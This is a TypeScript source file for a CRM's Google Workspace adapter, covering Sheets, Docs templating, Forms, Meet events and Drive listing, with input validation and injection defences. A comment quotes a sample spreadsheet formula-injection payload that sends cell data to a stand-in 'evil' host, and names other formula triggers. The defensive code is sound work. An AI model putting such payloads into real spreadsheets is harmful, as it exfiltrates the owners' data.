import { createHash } from 'node:crypto';
import type { GoogleCapability } from '@crm/contracts';
import { googleCalendarEnv } from '../../../config/domains/appointments-booking.env';
import {
  classifyApiError,
  GoogleCalendarError,
  googleFailureCode,
} from '../appointments-booking/google-calendar.errors';
import { googleRequest } from '../appointments-booking/google-transport';
import {
  GoogleAccountError,
  type DocGenerate,
  type GoogleAccessTokens,
  type GoogleFileItem,
  type GoogleFileKind,
  type GoogleWorkspacePort,
  type MeetCreate,
  type SheetAppend,
  type SheetAppendRows,
  type SheetRead,
} from './google-workspace.port';

const enc = encodeURIComponent;

/**
 * A Google file id is letters, digits, `_` and `-`. A flow author types or pastes the id, and it goes into a fixed Google URL: anything else
 * (a `..` that the URL parser would resolve to another path, a `?` or `#`) is refused here instead of being trusted to the encoder.
 */
const GOOGLE_ID = /^[A-Za-z0-9_-]{1,256}$/;
function fileId(id: string, capability: GoogleCapability): string {
  if (!GOOGLE_ID.test(id)) {
    throw new GoogleAccountError('GOOGLE_BAD_REQUEST', 'Not a Google file id', capability);
  }
  return enc(id);
}

/** Google's own hosts only (the environment names them, a flow author never does): every id is encoded into a fixed URL. */
const apis = () => {
  const env = googleCalendarEnv();
  return {
    sheets: env.GOOGLE_SHEETS_API_URL,
    drive: env.GOOGLE_DRIVE_API_URL,
    docs: env.GOOGLE_DOCS_API_URL,
    forms: env.GOOGLE_FORMS_API_URL,
    calendar: env.GOOGLE_CALENDAR_API_URL,
  };
};

/** A1 range for a tab: the quoted tab name, or the first tab when none is named. */
const tabRange = (tab: string, cells = ''): string =>
  tab === ''
    ? cells === ''
      ? 'A1'
      : cells
    : `'${tab.replace(/'/g, "''")}'${cells ? `!${cells}` : ''}`;

const norm = (s: unknown): string =>
  String(s ?? '')
    .trim()
    .toLowerCase();

const MIME: Record<GoogleFileKind, string> = {
  sheets: 'application/vnd.google-apps.spreadsheet',
  docs: 'application/vnd.google-apps.document',
  forms: 'application/vnd.google-apps.form',
};

/**
 * A cell that Sheets would run as a formula (`=IMPORTDATA(...)`, `@SUM(...)`, `+cmd|...`, `-2+3`, `+91 98765`) is stored as text instead.
 * Rows are written with `USER_ENTERED` so dates and numbers keep their type (as Reference), but a customer controls much of what a flow
 * writes (profile name, typed answers): left alone, a name of `=IMPORTXML("https://evil/?"&A1)` would run in the owner's sheet. A leading
 * space, tab, carriage return or other control character in front of the trigger does not hide it (spreadsheets trim some of them, and
 * a tab or CR is itself a known trigger). A plain number (`-5`, `12.50`, `+919876543210`) is not a formula and stays as it is, so numbers
 * stay numbers.
 */
export function neutraliseFormula(value: string): string {
  // eslint-disable-next-line no-control-regex
  const lead = /^[\u0000-\u0020\u00a0\u200b-\u200d\ufeff]*/.exec(value)![0];
  const rest = value.slice(lead.length);
  if (/[\t\r]/.test(lead)) return `'${value}`;
  if (/^[=@]/.test(rest)) return `'${value}`;
  if (/^[+-]/.test(rest) && !/^[+-]?\d+(\.\d+)?$/.test(rest)) return `'${value}`;
  return value;
}

/**
 * A value that goes into a document placeholder must not itself be a placeholder: the fills run one after the other, so a customer who
 * types `{{api_token}}` as their name would otherwise have the NEXT fill replace it with that variable's value, inside a document that
 * is then shared by link. A zero-width space after each `{` keeps the text readable and stops it matching.
 */
export function defangPlaceholders(value: string): string {
  return value.replace(/\{/g, '{\u200b');
}

/**
 * The Google REST APIs behind `GoogleWorkspacePort`, called with the workspace's one Google account through `GoogleAccessTokens`. Every
 * failure leaves as a `GoogleAccountError` with a stable code; Google's wording never reaches a flow author or a log line, and a token
 * never does either (the token is only ever in the Authorization header of `googleRequest`).
 */
export class HttpGoogleWorkspace implements GoogleWorkspacePort {
  constructor(
    private readonly tokens: GoogleAccessTokens,
    private readonly http?: typeof fetch,
  ) {}

  private async call<T>(
    orgId: number,
    capability: GoogleCapability,
    url: string,
    init: { method?: string; body?: unknown; idempotent?: boolean } = {},
  ): Promise<T> {
    try {
      return (await this.tokens.withToken(orgId, capability, (token) =>
        googleRequest(url, {
          method: init.method,
          token,
          headers: init.body === undefined ? {} : { 'content-type': 'application/json' },
          body: init.body === undefined ? undefined : JSON.stringify(init.body),
          classify: classifyApiError,
          idempotent: init.idempotent,
          fetchImpl: this.http,
        }),
      )) as T;
    } catch (err) {
      throw toAccountError(err, capability);
    }
  }

  private async headerRow(orgId: number, sheetId: string, tab: string): Promise<string[]> {
    const r = await this.call<{ values?: string[][] }>(
      orgId,
      'sheets',
      `${apis().sheets}/${fileId(sheetId, 'sheets')}/values/${enc(tabRange(tab, '1:1'))}`,
    );
    return (r.values?.[0] ?? []).map(String);
  }

  async appendSheetRow(orgId: number, req: SheetAppend): Promise<void> {
    const { values, ...rest } = req;
    await this.appendSheetRows(orgId, { ...rest, rows: [values] });
  }

  async appendSheetRows(orgId: number, req: SheetAppendRows): Promise<void> {
    let rows = req.rows;
    if (req.matchByHeader && req.columnHeaders.length > 0) {
      const sheet = await this.headerRow(orgId, req.sheetId, req.tabName);
      if (sheet.length > 0) {
        rows = rows.map((r) => placeUnderHeaders(sheet, req.columnHeaders, r));
      }
    }
    await this.call(
      orgId,
      'sheets',
      `${apis().sheets}/${fileId(req.sheetId, 'sheets')}/values/${enc(tabRange(req.tabName))}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
      // A repeat of a row append cannot be told from a second row: only a 429 (refused before any work) is retried. All the rows of a
      // step travel in this one request, so a failed call wrote all of them or none.
      {
        method: 'POST',
        body: { values: rows.map((r) => r.map(neutraliseFormula)) },
        idempotent: false,
      },
    );
  }

  async readSheetRows(orgId: number, req: SheetRead): Promise<Array<Record<string, string>>> {
    const r = await this.call<{ values?: string[][] }>(
      orgId,
      'sheets',
      `${apis().sheets}/${fileId(req.sheetId, 'sheets')}/values/${enc(tabRange(req.tabName, 'A:ZZ'))}`,
    );
    const [headers = [], ...body] = r.values ?? [];
    const rows: Array<Record<string, string>> = [];
    const col =
      req.matchColumn === '' ? -1 : headers.findIndex((h) => norm(h) === norm(req.matchColumn));
    if (req.matchColumn !== '' && col < 0) return rows;
    for (const cells of body) {
      if (col >= 0 && norm(cells[col]) !== norm(req.matchValue)) continue;
      const row: Record<string, string> = {};
      headers.forEach((h, i) => {
        if (String(h).trim() !== '') row[String(h)] = String(cells[i] ?? '');
      });
      rows.push(row);
      if (rows.length >= req.limit) break;
    }
    return rows;
  }

  async generateDoc(orgId: number, req: DocGenerate): Promise<{ url: string; warnings: string[] }> {
    // The grant may read every file of the account (full Drive scope), and the copy is shared by link: only a Google Doc is copied, not
    // whatever file id a flow author typed.
    const meta = await this.call<{ mimeType?: string }>(
      orgId,
      'docs',
      `${apis().drive}/${fileId(req.templateId, 'docs')}?fields=mimeType`,
    );
    if (meta.mimeType !== 'application/vnd.google-apps.document') {
      throw new GoogleAccountError('GOOGLE_BAD_REQUEST', 'Not a Google document', 'docs');
    }
    const copy = await this.call<{ id: string }>(
      orgId,
      'docs',
      `${apis().drive}/${fileId(req.templateId, 'docs')}/copy`,
      { method: 'POST', body: { name: req.newTitle }, idempotent: false },
    );
    const warnings: string[] = [];
    // `{{key}}` and `{key}` both, as Reference did, so a template written either way is filled.
    const requests = Object.entries(req.vars).flatMap(([key, value]) =>
      [`{{${key}}}`, `{${key}}`].map((needle) => ({
        replaceAllText: {
          containsText: { text: needle, matchCase: false },
          replaceText: defangPlaceholders(value),
        },
      })),
    );
    // The copy exists from here on: a fill or a share that fails does not lose it (Reference kept the link and carried on).
    if (requests.length > 0) {
      try {
        await this.call(orgId, 'docs', `${apis().docs}/${fileId(copy.id, 'docs')}:batchUpdate`, {
          method: 'POST',
          body: { requests },
        });
      } catch (err) {
        warnings.push(`fill:${(err as GoogleAccountError).code ?? 'GOOGLE_UNAVAILABLE'}`);
      }
    }
    if (req.shareable) {
      try {
        await this.call(orgId, 'docs', `${apis().drive}/${fileId(copy.id, 'docs')}/permissions`, {
          method: 'POST',
          body: { type: 'anyone', role: 'reader' },
        });
      } catch (err) {
        warnings.push(`share:${(err as GoogleAccountError).code ?? 'GOOGLE_UNAVAILABLE'}`);
      }
    }
    return { url: `https://docs.google.com/document/d/${copy.id}/edit`, warnings };
  }

  async formResponderUrl(orgId: number, formId: string): Promise<{ url: string }> {
    const f = await this.call<{ responderUri?: string }>(
      orgId,
      'forms',
      `${apis().forms}/${fileId(formId, 'forms')}`,
    );
    if (!f.responderUri) {
      throw new GoogleAccountError('GOOGLE_NOT_FOUND', 'The form has no responder link', 'forms');
    }
    return { url: f.responderUri };
  }

  async createMeet(orgId: number, req: MeetCreate): Promise<{ meetUrl: string; eventId: string }> {
    const calendar = enc(await this.tokens.calendarId(orgId));
    const id = eventIdForKey(req.requestId);
    const body = {
      id,
      summary: req.title,
      start: { dateTime: req.startAt.toISOString(), timeZone: req.timeZone },
      end: { dateTime: req.endAt.toISOString(), timeZone: req.timeZone },
      conferenceData: {
        createRequest: {
          requestId: req.requestId,
          conferenceSolutionKey: { type: 'hangoutsMeet' },
        },
      },
    };
    const base = `${apis().calendar}/calendars/${calendar}/events`;
    let e: { id?: string; hangoutLink?: string };
    try {
      e = await this.call<{ id?: string; hangoutLink?: string }>(
        orgId,
        'calendar',
        `${base}?conferenceDataVersion=1&sendUpdates=${req.sendInvites ? 'all' : 'none'}`,
        { method: 'POST', body },
      );
    } catch (err) {
      // The id is derived from the step, so a 409 means this very step already made its event (a retried step, or a lost answer):
      // read it back instead of making a second meeting.
      if (!(err instanceof GoogleAccountError) || err.status !== 409) throw err;
      e = await this.call<{ id?: string; hangoutLink?: string }>(
        orgId,
        'calendar',
        `${base}/${id}?conferenceDataVersion=1`,
      ).catch(() => {
        throw err;
      });
    }
    if (!e.hangoutLink) {
      throw new GoogleAccountError(
        'GOOGLE_BAD_REQUEST',
        'Google created the event without a Meet link',
        'calendar',
      );
    }
    return { meetUrl: e.hangoutLink, eventId: e.id ?? id };
  }

  async listFiles(orgId: number, kind: GoogleFileKind): Promise<GoogleFileItem[]> {
    const q = new URLSearchParams({
      q: `mimeType='${MIME[kind]}' and trashed=false`,
      pageSize: '100',
      orderBy: 'modifiedTime desc',
      fields: 'files(id,name)',
    });
    const r = await this.call<{ files?: Array<{ id?: unknown; name?: unknown }> }>(
      orgId,
      'drive_listing',
      `${apis().drive}?${q}`,
    );
    return (r.files ?? [])
      .filter((f) => typeof f.id === 'string' && f.id !== '')
      .map((f) => ({ id: String(f.id), name: typeof f.name === 'string' ? f.name : String(f.id) }));
  }
}

/** A Google event id (base32hex: `0-9a-v`, 5 to 1024 characters) that is the same for the same key: a SHA-256, lower-case hex (64 characters). */
export function eventIdForKey(key: string): string {
  return createHash('sha256').update(key).digest('hex');
}

/** Whatever went wrong inside a Google call, as the stable error flows and pages branch on. A `GoogleAccountError` passes through. */
export function toAccountError(err: unknown, capability: GoogleCapability): GoogleAccountError {
  if (err instanceof GoogleAccountError) return err;
  if (err instanceof GoogleCalendarError) {
    const code = googleFailureCode(err);
    return new GoogleAccountError(
      code,
      `Google ${err.kind} (${err.status}${err.reason ? `, ${err.reason}` : ''})`,
      capability,
      err.retryAfterSeconds,
      err.status,
    );
  }
  return new GoogleAccountError(
    'GOOGLE_UNAVAILABLE',
    err instanceof Error ? err.message : String(err),
    capability,
  );
}

/**
 * Values under the sheet column whose header matches each label (case-insensitive, trimmed). A label the sheet lacks goes after the last
 * column so nothing is dropped (Reference's `match_by_header`).
 */
export function placeUnderHeaders(sheet: string[], labels: string[], values: string[]): string[] {
  const index = new Map<string, number>();
  sheet.forEach((h, i) => {
    const k = norm(h);
    if (k !== '' && !index.has(k)) index.set(k, i);
  });
  const row = sheet.map(() => '');
  const extra: string[] = [];
  labels.forEach((label, j) => {
    const v = values[j] ?? '';
    const at = index.get(norm(label));
    if (at !== undefined) row[at] = v;
    else if (v !== '' || label.trim() !== '') extra.push(v);
  });
  return [...row, ...extra];
}
